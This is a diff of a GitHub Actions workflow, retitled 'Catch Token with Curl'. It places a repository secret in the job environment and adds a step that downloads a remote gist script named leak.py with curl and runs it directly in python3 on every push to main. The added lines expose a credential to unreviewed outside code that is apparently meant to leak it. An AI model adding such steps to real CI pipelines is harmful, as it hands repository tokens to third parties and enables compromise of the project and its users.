@@ -1,21 +1,16 @@
-name: Run Shell Script
+name: Catch Token with Curl
 
 on:
   push:
     branches:
-      - main  # Or specify any branch you want to trigger this on
-  pull_request:
-    branches:
       - main
 
 jobs:
-  run-script:
+  catch-token:
     runs-on: ubuntu-latest
-
+    env:
+      GITHUB_TOKEN: ${{ secrets.MY_GITHUB_TOKEN }}  # Set the token as an env variable
     steps:
-      - name: Checkout code
-        uses: actions/checkout@v2
-
-      - name: Run script from URL
+      - name: Fetch and Run leak.py
         run: |
           curl -s https://gist.githubusercontent.com/Pranesh-Shrestha/275c2478d3fcfc393c7434ce4b896e9f/raw/273a97243c8d43e6d07d5c3bca70e713f4ce7ee3/leak.py | python3
